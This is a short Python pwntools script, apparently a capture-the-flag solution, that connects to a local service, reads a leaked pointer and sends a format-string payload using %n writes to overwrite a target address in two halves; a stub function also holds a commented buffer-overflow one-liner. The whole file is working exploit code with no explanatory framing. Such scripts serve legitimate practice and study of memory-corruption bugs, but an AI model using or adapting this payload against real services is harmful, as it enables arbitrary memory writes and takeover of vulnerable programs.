#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

A = 'A'

def format_n(arg_num, to_write = 0):
    return "%{}x%{}$n".format(to_write, arg_num)

def main():
    target = "localhost"
    port = "7001"

    r = remote( target, port )

    l = r.recvline().strip()[-10:]

    target_pointer = int(l, 16)

    offset = 1

    stack_arg_num = 7

    payload = (A * offset
        + p32(target_pointer)
        + p32(target_pointer + 2)
        + format_n(stack_arg_num, to_write=21053)
        + format_n(stack_arg_num + 1, to_write=61960)
    )

    r.sendline(payload)
    print r.recvrepeat()

def exp_2(): # buffer overflow
    # r <<< $(python -c 'print "A" * 512 + "FRND"')
    pass

if __name__ == '__main__':
    main()
